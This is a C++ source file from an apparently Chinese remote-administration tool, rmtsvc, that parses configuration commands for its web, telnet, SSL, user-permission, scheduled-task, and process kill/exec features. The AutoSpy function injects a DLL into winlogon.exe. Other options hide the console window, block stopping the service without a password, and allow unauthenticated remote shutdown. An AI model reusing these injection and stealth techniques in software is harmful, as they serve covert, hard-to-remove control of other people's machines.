/*******************************************************************
   *	parseCommand.cpp 
   *    DESCRIPTION:parse configuration commands in config file
   *
   *    AUTHOR:yyc
   *
   *    http://hi.baidu.com/yycblog/home
   *
   *    DATE:2005-12-30
   *	
   *******************************************************************/

#include "rmtsvc.h"
#include "shellCommandEx.h"
#include "cInjectDll.h"

//*********************define global user-defined certificate parameters start ****************************************
std::string g_strMyCert="";
std::string g_strMyKey="";
std::string g_strKeyPswd="";
std::string g_strCaCert="";
std::string g_strCaCRL="";
//set SSL certificate and CRL information, command format: 
//	ssls [mycert=<user SSL cert file>] [mykey=<user cert private key file>] [keypwd=<user private key password>] [caroot=<CA root cert>] [cacrl=<CA revocation list>]
//this parameter supports certificate files in PEM format
void docmd_ssls(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;
	
	if( (it=maps.find("mycert"))!=maps.end()) 
		g_strMyCert=(*it).second;
	else g_strMyCert="";
	if( (it=maps.find("mykey"))!=maps.end()) 
		g_strMyKey=(*it).second;
	else g_strMyKey="";
	if( (it=maps.find("keypwd"))!=maps.end()) 
		g_strKeyPswd=(*it).second;
	else g_strKeyPswd="";
	if( (it=maps.find("caroot"))!=maps.end()) 
		g_strCaCert=(*it).second;
	else g_strCaCert="";
	if( (it=maps.find("cacrl"))!=maps.end()) 
		g_strCaCRL=(*it).second;
	else g_strCaCRL="";
	//yyc modify 2007-01-24
	if(g_strMyCert!="") getAbsolutfilepath(g_strMyCert);
	if(g_strMyKey!="") getAbsolutfilepath(g_strMyKey);
	if(g_strCaCert!="") getAbsolutfilepath(g_strCaCert);
	if(g_strCaCRL!="") getAbsolutfilepath(g_strCaCRL);
}
//*********************define全局用户自define证书参数  end  ****************************************
//启动自动监视
BOOL MyService::AutoSpy(const char *commandline)
{
	std::string strProcessname=(m_bDebug)?"explorer.exe":"winlogon.exe";
	cInjectDll inject(strProcessname.c_str());	
	DWORD dwret=inject.Inject(NULL);
	if(dwret)
	{
		DWORD dwCreationFlags=(m_bDebug)?0:CREATE_NO_WINDOW;
		dwret=inject.spySelf(m_hStop,dwCreationFlags,commandline);
		if(dwret==0) 
			RW_LOG_PRINT(LOGLEVEL_INFO,"Success to spy,injecting into %s.\r\n",strProcessname.c_str());
		else
			RW_LOG_PRINT(LOGLEVEL_INFO,"Failed to inject into %s, Error Code=%d.\r\n",
										strProcessname.c_str(),(long)dwret);
		return (dwret==0)?TRUE:FALSE;
	}else
		RW_LOG_PRINT(LOGLEVEL_INFO,"Failed to open %s for Injection.\r\n",strProcessname.c_str());
	return FALSE;
}
//create定时任务 at=hh:mm/[t|d]
bool MyService::CreateTaskTime(const char *ptrAt,const char *strTask)
{
	if(ptrAt==NULL || strTask==NULL) return false;

	TaskTimer task; task.h=task.m=task.flag=task.type=0;
	task.strTask.assign(cUtils::strTrim((char *)strTask)); 
	char c=0; //定时任务type
	if(strchr(ptrAt,':'))
		 ::sscanf(ptrAt,"%d:%d/%c",&task.h,&task.m,&c);
	else ::sscanf(ptrAt,"%d/%c",&task.h,&c);
	
	if(c=='d') //每天定时执行
		task.type=c;
	else if(c=='t') //定time隔执行
		task.type=c;
	if(task.type==0) return false;
	RW_LOG_PRINT(LOGLEVEL_INFO,"TaskTimer: h=%d,m=%d,type=%c\r\n\t%s\r\n",
		task.h,task.m,c,task.strTask.c_str());
	m_tasklist.push_back(task); return true;
}

//ini文件支持的命令
void MyService::parseCommand(const char *strCommand)
{
	if(strCommand==NULL || strCommand[0]==0) return;
	while(*strCommand==' ') strCommand++;
	char *ptrAt=(char *)strstr(strCommand," at=");
	if(ptrAt){//此命令为定时任务
		*ptrAt='\0';
		CreateTaskTime(ptrAt+4,strCommand);
		*ptrAt=' '; return;
	}//?if(ptrAt){//此命令为定时任务
	
	if(strncasecmp(strCommand,"iprules ",8)==0)
	{
		std::map<std::string,std::string> maps;
		if(splitString(strCommand+8,' ',maps)<=0) return;
		std::map<std::string,std::string>::iterator it=maps.find("type");
		if(it!=maps.end() && (*it).second=="webs") 
		{	m_websvr.docmd_webiprules(strCommand+8); return; }
		else if(it!=maps.end() && (*it).second=="telnet")
		{	m_telsvr.docmd_iprules(strCommand+8); return; }
		//否则接着交m_vidcManager.parseCommand(pstart);解释
	}//?if(strncasecmp(strCommand,"iprules ",8)==0)

	if(strncasecmp(strCommand,"sets ",5)==0) //设置本服务的info
		this->docmd_sets(strCommand+5);
	else if(strncasecmp(strCommand,"ssls ",5)==0) //设置ssl证书info
		docmd_ssls(strCommand+5);
	else if(strncasecmp(strCommand,"telnet ",7)==0) //设置telnet
		m_telsvr.docmd_sets(strCommand+7);
	else if(strncasecmp(strCommand,"webs ",5)==0) //设置本服务info
		m_websvr.docmd_webs(strCommand+5);
	else if(strncasecmp(strCommand,"user ",5)==0)
		m_websvr.docmd_user(strCommand+5);
/*  //yyc remove MSN 2010-11-05
	else if(strncasecmp(strCommand,"msnbot ",7)==0)
		m_msnbot.docmd_msnbot(strCommand+7);
	else if(strncasecmp(strCommand,"proxy ",6)==0)
		m_msnbot.docmd_proxy(strCommand+6);
*/ //yyc remove MSN 2010-11-05
	else if(strncasecmp(strCommand,"kill ",5)==0) //杀死specified的进程
		::docmd_kill(strCommand+5);
	else if(strncasecmp(strCommand,"exec ",5)==0) //执行specified的程序
		::docmd_exec(strCommand+5);
	else if(strncasecmp(strCommand,"cmdpage ",8)==0)
		m_preCmdpage.assign(strCommand+8);
	//否则交m_vidcManager.parseCommand(pstart);解释
	else m_vidcManager.parseCommand(strCommand);
}

//设置本服务的info
//命令format: 
//	sets [log=<log output文件>] [opentype=APPEND] [loglevel=DEBUG|INFO|WARN|ERROR]
//log=<log output文件> : 设置程序是否数促日志文件，如果不specified则不输出否则输出specified的日志文件
//opentype=APPEND    : 设置program startup时是否为追加写日志文件还是覆盖写,如果不设置此项则为覆盖写
//loglevel=DEBUG|INFO|WARN|ERROR : 设置log output的级别，default为INFO级别
//stop_pswd=<stop service的password> : 设置stop service的password，如果设置了password则不输入password将无法stop service。
//		如果设置了password用户只能在命令行下通过-e <password> 命令stop service，而无法通过SCMservice control台或net stop命令stop service。
//		假如程序名为xx.exe,设置了停止password为123，则要停止此服务需在命令行下输入xx.exe -e 123
//faceless=TRUE : 如果以非服务方式启动且运行时没有specified-d参数则run without a window本程序
//		例如双击直接运行本程序时，如果设置了此项则run without a window，即使关闭控制台窗口程序也不会end
//		否则以带窗口的形式运行按Ctrl+c或者关闭窗口则程序将end
void MyService :: docmd_sets(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;
	if( (it=maps.find("opentype"))!=maps.end())
	{//设置日志文件为追加写的方式
		if((*it).second=="APPEND")
			RW_LOG_OPENFILE_APPEND();
	}
	if( (it=maps.find("log"))!=maps.end())
	{//设置日志文件
		if((*it).second!="" && (*it).second!="null")
		{
			getAbsolutfilepath((*it).second);
			RW_LOG_SETFILE((long)(*it).second.c_str())
		}
	}
	if( (it=maps.find("loglevel"))!=maps.end())
	{//设置log output级别
		if((*it).second=="DEBUG")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_DEBUG)
		else if((*it).second=="INFO")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_INFO)
		else if((*it).second=="WARN")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_WARN)
		else if((*it).second=="ERROR")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_ERROR)
	}

	if( (it=maps.find("spyself"))!=maps.end())
	{
		if((*it).second=="FALSE") m_bSpyself=false;
	}
	if( (it=maps.find("stop_pswd"))!=maps.end())
	{
		if( (*it).second!="") CreateStopEvent((*it).second.c_str());
	} 
	if( (it=maps.find("faceless"))!=maps.end())
	{
		if( (*it).second=="TRUE" ) m_bFaceless=true;
	}
	if( (it=maps.find("install"))!=maps.end())
	{
		if( (*it).second=="TRUE") InstallService();
	}
}

//设置web service的相关info
//命令format: 
//	webs [port=<web serviceport>] [bindip=<本服务绑定的local machineIP>] [root=<主目录>] [access=<对主目录的访问permissions>] [default=<default文档>]
//port=<服务port>    : 设置服务port，如果不设置则default为7778.设置为0则不start web service <0则随即分配port
//bindip=<本服务绑定的local machineIP> : 设置本服务绑定的local machineIP，如果不设置则default绑定local machine所有IP
//root=<主目录>     : specified此web service的根/对应的主目录。主目录是运行本服务local机的实际绝对path
//					如果主目录中包含空格则要用""将主目录括起
//					如果主目录等于""或空则default根目录为服务程序所在目录
//access=<对主目录的访问permissions> : specified此主目录的访问permissions。
//		如果不设置则default具有ACCESS_NONE访问permissions。设置format和含义如下
//		<对主目录的访问permissions> : <FILE_READ|FILE_WRITE|FILE_EXEC|DIR_LIST|DIR_NOINHERIT>
//		ACCESS_ALL=FILE_READ|FILE_WRITE|FILE_EXEC|DIR_LIST
//		FILE_READ : 读取 FILE_WRITE : 写入 FILE_EXEC : 执行
//		DIR_LIST : 目录浏览
//		DIR_NOINHERIT : 是否允许此虚目录对应的真实path下的子目录继承用户specified的目录访问permissions。
//default=<default文档>
//resource=<FALSE> : 不从程序资源中获取文件
void webServer :: docmd_webs(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;

	if( (it=maps.find("port"))!=maps.end())
	{//设置服务的port
		m_svrport=atoi((*it).second.c_str());
	}
	if( (it=maps.find("bindip"))!=maps.end())
	{//设置服务绑定IP
		m_bindip=(*it).second;
	}
	if( (it=maps.find("poweroff"))!=maps.end())
	{//是否无需permissions可直接remote关机或重启
		if((*it).second=="ANYONE") m_bPowerOff=true;
	}
	if( (it=maps.find("resource"))!=maps.end())
	{
		if((*it).second=="FALSE") m_bGetFileFromRes=false;
	}

	long lAccess=HTTP_ACCESS_NONE;
	std::string rootpath,defaultPage;
	if( (it=maps.find("root"))!=maps.end())
		rootpath=(*it).second;
	if( (it=maps.find("access"))!=maps.end())
	{
		const char *ptr=(*it).second.c_str();
		if(strstr(ptr,"FILE_READ")) lAccess|=HTTP_ACCESS_READ;
		if(strstr(ptr,"FILE_WRITE")) lAccess|=HTTP_ACCESS_WRITE;
		if(strstr(ptr,"FILE_EXEC")) lAccess|=HTTP_ACCESS_EXEC;
		if(strstr(ptr,"DIR_LIST")) lAccess|=HTTP_ACCESS_LIST;
		if(strstr(ptr,"DIR_NOINHERIT")) lAccess|=HTTP_ACCESS_SUBDIR_INHERIT;
		if(strstr(ptr,"ACCESS_ALL")) lAccess=HTTP_ACCESS_ALL;
	}
	if(!m_bGetFileFromRes) //如果specified不从exe资源中获取web页面，那么最少需要只read permission
			lAccess|=HTTP_ACCESS_READ;

	if( (it=maps.find("default"))!=maps.end())
		defaultPage=(*it).second;
	this->setRoot(rootpath.c_str(),lAccess,defaultPage.c_str());
	
	//web service的SSL支持配置参数
	if( (it=maps.find("ssl_enabled"))!=maps.end() && (*it).second=="true")
		m_bSSLenabled=true;
	else m_bSSLenabled=false;
	if( (it=maps.find("ssl_verify"))!=maps.end() && (*it).second=="true")
		m_bSSLverify=true;
	else m_bSSLverify=false;
	
	return;
}

//设置web service的ip过滤规则或针对某个account的IP filter rules
//命令format:
//	webiprules [access=0|1] ipaddr="<IP>,<IP>,..."
//access=0|1     : 对符合下列IP条件的是拒绝还是放行
//例如:
// webiprules access=0 ipaddr="192.168.0.*,192.168.1.10"
void webServer :: docmd_webiprules(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;

	int ipaccess=1;
	if( (it=maps.find("access"))!=maps.end())
		ipaccess=atoi((*it).second.c_str());
	
	if( (it=maps.find("ipaddr"))!=maps.end())
	{
		std::string ipRules=(*it).second;
		this->rules().addRules_new(RULETYPE_TCP,ipaccess,ipRules.c_str());
	}else this->rules().addRules_new(RULETYPE_TCP,ipaccess,NULL);

	return;
}

//设置访问者accountpermissionsinfo
//命令format：
//	user account=<account> [pswd=<account password>] [acess=<account的访问permissions>]
//account=<访问account> : 必须项. 要添加的rmtsvc访问者account。
//pswd=<account password>    : 必须项. specifiedaccount的password
//access=<account的访问permissions>
//	如果不设置则default具有ACCESS_NONE访问permissions。设置format和含义如下
//		ACCESS_ALL=ACCESS_SCREEN_ALL|ACCESS_FILE_ALL|ACCESS_REGIST_ALL|ACCESS_SERVICE_ALL|ACCESS_TELNET_ALL;
//		ACCESS_SCREEN_ALL: remote screen完全控制permissions
//		ACCESS_SCREEN_VIEW: remote查看屏幕permissions
//		ACCESS_FILE_ALL  : remote file management操作，可读写delete等
//		ACCESS_FILE_VIEW : remote file management紧紧允许读，download
//		ACCESS_REGIST_ALL: remoteregistry management可读写添加delete等
//		ACCESS_REGIST_VIEW:紧紧可查看registryinfo
//		ACCESS_SERVICE_ALL:remoteservice management，可完全操作
//		ACCESS_SERVICE_VIEW:remote服务权利仅仅可查看
//		ACCESS_TELNET_ALL:  remotetelnet管理
//		ACCESS_FTP_ADMIN : remoteFTP服务配置管理
void webServer :: docmd_user(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;
	
	std::string user,pswd;
	long lAccess=RMTSVC_ACCESS_NONE;
	if( (it=maps.find("account"))!=maps.end())
		user=(*it).second;
	if( (it=maps.find("pswd"))!=maps.end())
		pswd=(*it).second;

	if( (it=maps.find("access"))!=maps.end())
	{
		const char *ptr=(*it).second.c_str();
		if(strstr(ptr,"ACCESS_SCREEN_VIEW")) lAccess|=RMTSVC_ACCESS_SCREEN_VIEW;
		if(strstr(ptr,"ACCESS_SCREEN_ALL")) lAccess|=RMTSVC_ACCESS_SCREEN_ALL;
		if(strstr(ptr,"ACCESS_REGIST_VIEW")) lAccess|=RMTSVC_ACCESS_REGIST_VIEW;
		if(strstr(ptr,"ACCESS_REGIST_ALL")) lAccess|=RMTSVC_ACCESS_REGIST_ALL;
		if(strstr(ptr,"ACCESS_SERVICE_VIEW")) lAccess|=RMTSVC_ACCESS_SERVICE_VIEW;
		if(strstr(ptr,"ACCESS_SERVICE_ALL")) lAccess|=RMTSVC_ACCESS_SERVICE_ALL;
		if(strstr(ptr,"ACCESS_TELNET_VIEW")) lAccess|=RMTSVC_ACCESS_TELNET_VIEW;
		if(strstr(ptr,"ACCESS_TELNET_ALL")) lAccess|=RMTSVC_ACCESS_TELNET_ALL;
		if(strstr(ptr,"ACCESS_FILE_VIEW")) lAccess|=RMTSVC_ACCESS_FILE_VIEW;
		if(strstr(ptr,"ACCESS_FILE_ALL")) lAccess|=RMTSVC_ACCESS_FILE_ALL;
		if(strstr(ptr,"ACCESS_FTP_ADMIN")) lAccess|=RMTSVC_ACCESS_FTP_ADMIN;
		if(strstr(ptr,"ACCESS_VIDC_ADMIN")) lAccess|=RMTSVC_ACCESS_VIDC_ADMIN;
		if(strstr(ptr,"ACCESS_ALL")) lAccess=RMTSVC_ACCESS_ALL;
	}
	if(user!="" && lAccess!=RMTSVC_ACCESS_NONE)
	{
		::_strlwr((char *)user.c_str());
		std::pair<std::string,long> p(pswd,lAccess);
		m_mapUsers[user]=p;
	}
	m_bAnonymous=false; //如果配置了账号则不允许匿名访问
}
/* //yyc remove MSN 2010-11-05
//设置msn机器人相关info
//命令format:
//	msnbot account=<msnaccount>:<password> [trusted=<受信任的msnaccount>] [prefix="<移动MSN返回消息前缀>"]
//account=<msnaccount>:<password> : specifiedmsn机器人的登录account和password.
//trusted=<受信任的msnaccount>: specifiedmsn机器人信任的msnaccount，
//			  此account和msn机器人聊天控制无需输入控制访问password
//			  可输入多个account，用','分割
//prefix="<移动MSN返回消息前缀>"
BOOL msnShell :: docmd_msnbot(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return FALSE;
	std::map<std::string,std::string>::iterator it;

	if( (it=maps.find("account"))!=maps.end())
	{//format ：account:password
		this->setMsnAccount((*it).second.c_str());
		const char *ptr=strchr((*it).second.c_str(),':');
		if(ptr)
		{
			MyService *ptrService=MyService::GetService();
			webServer *pwwwSvc=&ptrService->m_websvr;//指向www服务的指针
			*(char *)ptr=0; ptr++; char s[128]; 
			sprintf(s,"account=%s pswd=%s access=ACCESS_ALL",(*it).second.c_str(),ptr);
			pwwwSvc->docmd_user(s);
		}
	}
	if( (it=maps.find("trusted"))!=maps.end())
	{
		this->m_strTrusted=(*it).second;
		::_strlwr((char *)this->m_strTrusted.c_str());
	}
	if( (it=maps.find("prefix"))!=maps.end())
	{
		this->m_prefix==(*it).second;
	}else this->m_prefix="对方正在使用手机MSN,详见http://mobile.msn.com.cn。";
		            
	return TRUE;
}

//设置msn机器人的代理info
//命令format: 
//	proxy type=HTTPS|SOCKS4|SOCKS5 host=<proxy serviceaddress> port=<proxy service port> [user=<访问proxy serviceaccount>] [pswd=<访问proxy servicepassword>]
BOOL msnShell :: docmd_proxy(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return FALSE;
	PROXYTYPE ptype=PROXY_NONE;
	int proxyport=0;
	std::string host,user,pswd;
	std::map<std::string,std::string>::iterator it;
	if( (it=maps.find("type"))!=maps.end())
	{
		if((*it).second=="HTTPS")
			ptype=PROXY_HTTPS;
		else if((*it).second=="SOCKS4")
			ptype=PROXY_SOCKS4;
		else if((*it).second=="SOCKS5")
			ptype=PROXY_SOCKS5;
	}
	if( (it=maps.find("port"))!=maps.end())
		proxyport=atoi((*it).second.c_str());
	
	if( (it=maps.find("host"))!=maps.end())
		host=(*it).second;
	if( (it=maps.find("user"))!=maps.end())
		user=(*it).second;
	if( (it=maps.find("pswd"))!=maps.end())
		pswd=(*it).second;

	if( m_curAccount.m_chatSock.setProxy(ptype,host.c_str(),
		proxyport,user.c_str(),pswd.c_str()) )
		return TRUE;
	return FALSE;
}
*/ //yyc remove MSN 2010-11-05
//------------------------------------private function----------------------
int splitString(const char *str,char delm,std::map<std::string,std::string> &maps)
{
//	printf("split String - %s\r\n",str);
	if(str==NULL) return 0;
	while(*str==' ') str++;//delete前导空格
	const char *ptr,*ptrStart,*ptrEnd;
	while( (ptr=strchr(str,'=')) )
	{
		char dm=delm; ptrStart=ptr+1;
		if(*ptrStart=='"') {dm='"'; ptrStart++; }
		ptrEnd=ptrStart;
		while(*ptrEnd && *ptrEnd!=dm) ptrEnd++;

		*(char *)ptr=0;
		::_strlwr((char *)str);
		maps[str]=std::string(ptrStart,ptrEnd-ptrStart);
		*(char *)ptr='=';

		if(*ptrEnd==0) break;
		str=ptrEnd+1;
		while(*str==' ') str++;//delete前导空格
	}//?while(ptr)
	
//	std::map<std::string,std::string>::iterator it=maps.begin();
//	for(;it!=maps.end();it++)
//		printf("\t %s - %s.\r\n",(*it).first.c_str(),(*it).second.c_str());

	return maps.size();
}

int splitString(const char *str,char delm,std::vector<std::string> &vec,int maxSplit)
{
	if(str==NULL) return 0;
	while(*str==' ') str++;//delete前导空格
	const char *ptr=strchr(str,delm);
	while(true)
	{
		if(maxSplit>0 && (int)vec.size()>=maxSplit)
		{
			vec.push_back(str); break;
		}
		if(ptr) *(char *)ptr=0;
		vec.push_back(str);
		if(ptr==NULL) break;
		*(char *)ptr=delm; str=ptr+1;
		while(*str==' ') str++;//delete前导空格
		ptr=strchr(str,delm);
	}//?while
	return vec.size();
}
